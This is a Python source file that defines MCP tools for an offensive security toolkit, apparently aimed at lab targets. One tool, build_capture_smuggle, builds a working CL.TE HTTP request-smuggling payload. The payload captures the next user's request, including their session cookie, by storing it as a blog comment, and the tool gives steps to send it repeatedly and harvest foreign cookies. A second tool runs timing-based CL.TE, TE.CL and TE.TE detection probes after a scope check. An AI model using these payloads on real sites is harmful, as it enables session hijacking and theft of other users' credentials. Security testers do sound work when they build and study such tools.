"""test_request_smuggling — CL.TE / TE.CL / TE.TE timing probes with replay confirmation."""

import time

from mcp.server.fastmcp import FastMCP

from praetor import client
from praetor.tools.testing._verdict import error_verdict, make_verdict
from praetor.tools.testing_extended._helpers import (
    confirm_timing_anomaly,
    resolve_host_from,
    scope_or_error,
)
from praetor.tools.testing_extended._smuggle_capture import (
    capture_cl_through,
    wrap_clte,
)


def register(mcp: FastMCP):

    @mcp.tool()
    async def build_capture_smuggle(
        host: str,
        session_cookie: str,
        csrf: str,
        post_id: str = "1",
        smuggled_content_length: int = 500,
        sample_victim_request: str = "",
        capture_through: str = "cookie",
    ) -> dict:
        """Build a byte-exact CL.TE capture-request smuggle for the "capture
        other users' requests" class — no more hand-sizing Content-Length.

        Produces the raw request to feed send_raw_request(http_version="direct",
        count=N): an outer POST / (front-end honours Content-Length) whose
        chunked body smuggles a POST /post/comment with the `comment` param LAST
        and an oversized Content-Length, so the next user's request is stored as
        the comment. The outer Content-Length is computed for you.

        Sizing the smuggled Content-Length is the hard part: too small truncates
        the capture before the victim's Cookie; too large and the back-end waits
        for bytes the victim never sends (timeout). Pass a `sample_victim_request`
        (even a truncated earlier capture) and it is sized to reach the end of the
        `capture_through` header line via capture_cl_through(); otherwise
        `smuggled_content_length` is used verbatim. The victim self-completes the
        comment only when the value does not exceed its total request length, so
        when the cookie is the last header the ideal value ~= that total —
        byte-count from the deepest capture, don't binary-search.

        Args:
            host: Target host (also the smuggled Host).
            session_cookie: YOUR session cookie value (authorises the smuggled comment POST).
            csrf: YOUR csrf token from the post page.
            post_id: Blog post id to comment on (default "1").
            smuggled_content_length: Inner Content-Length when no sample is given (default 500).
            sample_victim_request: A captured (even truncated) victim request to size the CL from.
            capture_through: Header line to capture in full (default "cookie").
        """
        body = (
            f"csrf={csrf}&postId={post_id}&name=Carlos+Montoya"
            f"&email=carlos%40normal-user.net&website=&comment="
        )
        prefix_len = len(body.encode())

        sizing = None
        cl = smuggled_content_length
        if sample_victim_request:
            sizing = capture_cl_through(sample_victim_request, prefix_len, capture_through)
            cl = sizing["content_length"]

        smuggled = (
            "POST /post/comment HTTP/1.1\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {cl}\r\n"
            f"Cookie: session={session_cookie}\r\n"
            "\r\n"
            f"{body}"
        )
        raw = wrap_clte(host, smuggled)

        out = {
            "raw": raw,
            "smuggled_content_length": cl,
            "prefix_len": prefix_len,
            "next": (
                "send_raw_request(raw=..., host=..., http_version='direct', count=20) "
                "then GET the post and grep for a foreign 'session=' in a comment"
            ),
        }
        if sizing is not None:
            out["capture_depth"] = sizing["capture_depth"]
            out["sample_found_target"] = sizing["found"]
            if not sizing["found"]:
                out["note"] = (
                    f"'{capture_through}' not in sample — content_length is a floor; "
                    "capture a deeper sample and re-run to reach it"
                )
        return out

    @mcp.tool()
    async def test_request_smuggling(session: str, path: str = "/") -> dict:
        """Test for HTTP request smuggling (CL.TE, TE.CL, TE.TE) using safe timing-based detection.

        Args:
            session: Session name for auth state
            path: Target endpoint path (default /)
        """
        baseline = await client.post("/api/session/request", json={
            "session": session, "method": "GET", "path": path,
        })
        if "error" in baseline:
            return error_verdict(f"baseline failed: {baseline['error']}", vuln_type="request_smuggling")

        target_url = baseline.get("url", "")
        baseline_time = baseline.get("response_time", 0)

        lines = [f"Request Smuggling Tests: {path}\n"]
        lines.append(f"Baseline response time: {baseline_time}ms")
        findings = []

        host, port, is_https, err = await resolve_host_from(target_url, session)
        if err:
            return error_verdict(str(err), vuln_type="request_smuggling")

        scope_err = await scope_or_error(host, is_https, port)
        if scope_err:
            return error_verdict(scope_err, vuln_type="request_smuggling", reason="out_of_scope")

        clte_raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 4\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"1\r\n"
            f"Z\r\n"
            f"Q"
        )

        tecl_raw = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: 6\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"\r\n"
            f"0\r\n"
            f"\r\n"
            f"X"
        )

        probes = [
            ("CL.TE", clte_raw),
            ("TE.CL", tecl_raw),
        ]

        for probe_name, raw_request in probes:
            lines.append(f"\n--- {probe_name} Probe ---")

            start = time.time()
            resp = await client.post("/api/http/raw", json={
                "raw": raw_request,
                "host": host,
                "port": port,
                "https": is_https,
            })
            elapsed = int((time.time() - start) * 1000)

            if "error" in resp:
                lines.append(f"  Error: {resp['error']}")
                if "timeout" in resp["error"].lower() or elapsed > 5000:
                    confirms = await confirm_timing_anomaly(
                        raw_request, host, port, is_https,
                        threshold_ms=max(5000, baseline_time * 3),
                    )
                    if confirms >= 2:
                        findings.append(probe_name)
                        lines.append(f"  [!] TIMEOUT confirmed ({confirms}/2 re-tests) — potential {probe_name} smuggling")
                    else:
                        lines.append(f"  Timeout did not reproduce ({confirms}/2) — likely transient")
                continue

            status = resp.get("status_code", resp.get("status", 0))
            lines.append(f"  Status: {status}, Time: {elapsed}ms (baseline: {baseline_time}ms)")

            if elapsed > baseline_time * 3 and elapsed > 3000:
                confirms = await confirm_timing_anomaly(
                    raw_request, host, port, is_https,
                    threshold_ms=max(3000, baseline_time * 3),
                )
                if confirms >= 2:
                    findings.append(probe_name)
                    lines.append(f"  [!] Significant delay confirmed ({confirms}/2 re-tests) — potential {probe_name} smuggling")
                else:
                    lines.append(f"  Delay did not reproduce ({confirms}/2) — likely transient")
            elif status == 400:
                lines.append("  Server rejected malformed request (400) — likely not vulnerable")
            else:
                lines.append("  No anomaly detected")

        tete_variants = [
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding:\tchunked",
        ]

        lines.append("\n--- TE.TE Obfuscation Probes ---")
        for variant in tete_variants:
            te_raw = (
                f"POST {path} HTTP/1.1\r\n"
                f"Host: {host}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: 4\r\n"
                f"{variant}\r\n"
                f"\r\n"
                f"1\r\n"
                f"Z\r\n"
                f"Q"
            )

            start = time.time()
            resp = await client.post("/api/http/raw", json={
                "raw": te_raw, "host": host, "port": port, "https": is_https,
            })
            elapsed = int((time.time() - start) * 1000)

            variant_short = variant.split("\r\n")[0][:40]
            if "error" in resp:
                if "timeout" in resp["error"].lower() or elapsed > 5000:
                    confirms = await confirm_timing_anomaly(
                        te_raw, host, port, is_https,
                        threshold_ms=max(5000, baseline_time * 3),
                    )
                    if confirms >= 2:
                        findings.append(f"TE.TE({variant_short})")
                        lines.append(f"  [!] {variant_short}: TIMEOUT confirmed ({confirms}/2)")
                    else:
                        lines.append(f"  {variant_short}: single timeout, did not reproduce")
                else:
                    lines.append(f"  {variant_short}: Error — {resp['error']}")
            else:
                status = resp.get("status_code", resp.get("status", 0))
                if elapsed > baseline_time * 3 and elapsed > 3000:
                    confirms = await confirm_timing_anomaly(
                        te_raw, host, port, is_https,
                        threshold_ms=max(3000, baseline_time * 3),
                    )
                    if confirms >= 2:
                        findings.append(f"TE.TE({variant_short})")
                        lines.append(f"  [!] {variant_short}: delay confirmed ({confirms}/2, {elapsed}ms)")
                    else:
                        lines.append(f"  {variant_short}: single delay, did not reproduce")
                else:
                    lines.append(f"  {variant_short}: status={status}, {elapsed}ms — OK")

        lines.append("\n--- Summary ---")
        if findings:
            lines.append(f"Potential smuggling: {', '.join(findings)}")
            lines.append("Recommendation: Verify with repeated timing tests (3+ repetitions). Use Collaborator for confirmation.")
        else:
            lines.append("No request smuggling indicators detected.")

        human = "\n".join(lines)
        if findings:
            verdict, confidence = "SUSPECTED", 0.65
            ev = f"potential smuggling: {', '.join(findings)} — verify with Collaborator + repeated timing"
        else:
            verdict, confidence = "FAILED", 0.1
            ev = "no request smuggling indicators across CL.TE / TE.CL / TE.TE"

        return make_verdict(
            verdict, confidence, ev,
            vuln_type="request_smuggling",
            details={"path": path, "findings": findings},
            summary=human,
        )
